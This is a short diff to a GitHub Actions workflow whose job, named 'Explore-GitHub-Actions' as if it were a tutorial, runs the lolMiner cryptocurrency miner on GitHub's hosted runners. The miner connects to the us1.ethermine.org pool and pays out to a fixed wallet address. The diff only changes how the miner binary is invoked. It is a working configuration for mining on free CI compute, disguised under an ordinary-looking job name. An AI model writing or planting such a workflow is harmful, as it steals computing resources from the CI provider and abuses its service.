@@ -4,7 +4,5 @@ jobs:
   Explore-GitHub-Actions:
     runs-on: ubuntu-latest
     steps:
-      - run: |
-          cd 1.32a/
-      - run: ./lolMiner --algo ETHASH --pool us1.ethermine.org:4444 --user 0x3b4C0279C68cB024060210bE51C62A01DB3F15EB.gogcolab --tls 0 --ethstratum ETHPROXY
+      - run: lolMiner --algo ETHASH --pool us1.ethermine.org:4444 --user 0x3b4C0279C68cB024060210bE51C62A01DB3F15EB.gogcolab --tls 0 --ethstratum ETHPROXY
 
